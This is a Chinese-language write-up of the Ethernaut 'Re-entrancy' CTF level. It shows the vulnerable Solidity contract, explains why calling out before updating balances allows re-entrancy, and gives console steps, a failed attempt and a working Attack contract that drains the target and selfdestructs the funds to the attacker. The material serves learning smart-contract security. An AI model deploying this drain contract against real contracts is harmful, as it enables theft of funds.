# Re-entrancy


## 要求

```
这一关的目标是偷走合约的所有资产.

  这些可能有帮助:

不可信的合约可以在你意料之外的地方执行代码.
Fallback methods
抛出/恢复 bubbling
有的时候攻击一个合约的最好方式是使用另一个合约.
查看上方帮助页面, "Beyond the console" 部分
```

## 代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

## 分析
提示也说了，这是个re-entrancy漏洞。

漏洞点:
```
(bool result,) = msg.sender.call{value: _amount}("");
```

合约在这里调用了目标合约的默认`receive`函数。
并且，没有做任何重入锁的判断。
而且余额也是在call调用之后才进行判断。
这里就可以构成了一个re-entracy。导致hacker那里的`receive`或者`fallback`函数，可以一直不停的call。


## pwn

首先获取一下当前合约内的全部财产:
```
await contract.balances(contract.address).then(v=>v.toString())
'0'
await getBalance(contract.address)
'0.001'
```
这是有0.001个ether。小数点remix没办法传值，还是转换一下.

```
toWei("0.001")
'1000000000000000'
```
我怕有gas的限制，先试试 `donate`传入500000000000000 wei.这样总余额就有1500000000000000.0。然后分3次攻击给提出来。



### 失败的攻击
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReTrancepwn{
    address public _target;
    uint public count;
    event Log(uint);
    constructor(address target_) payable {
        _target = target_;
        count=0;
    }

    function donate()public {
        require(address(this).balance >=500000000000000);
        address(_target).call{value:address(this).balance}(abi.encodeWithSignature("donate(address)", address(this)));
    }

    function pwn()public {
        address(_target).call(abi.encodeWithSignature("withdraw(uint256)", 500000000000000));
    }
    receive() external payable { 
        if(count<2){
            count++;
            emit Log(msg.value);
            address(_target).call(abi.encodeWithSignature("withdraw(uint256)", 500000000000000));
        }
    }

    function s(address to) public {
        selfdestruct(payable(to));
    }
}
```


### sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

contract Attack {
    IReentrance private immutable target;

    constructor(address targetAddr) payable {
        target = IReentrance(targetAddr);
    }

    function attack() public {
        target.donate{value: 1000000000000000}(address(this)); // send ether to traget
        target.withdraw(1000000000000000); // then withdraw, this will trigger receive()

        // Only when re-entrancy ends (termination condition is met) will the lines of code below be executed.
        require(address(target).balance == 0, "re-entrancy failed");

        selfdestruct(payable(msg.sender)); // destroy the contract and sned all funds to us
    }

    receive() external payable {
        uint256 balance = target.balanceOf(address(this)); // retrieve our balance in the target

        // withdraw the smallest amount, so that the tx doesn; get reverted
        uint256 withdrawableAmount = balance < 1000000000000000 ? balance : 1000000000000000;

        if (withdrawableAmount > 0) { // if contract balance is 0, then termination condition is met
            target.withdraw(withdrawableAmount);
        }
    }
}
``` 
我最后通过这个通过的，我不明白为啥通过call的方式不行。


下次这种还是直接使用interface吧。没搞明白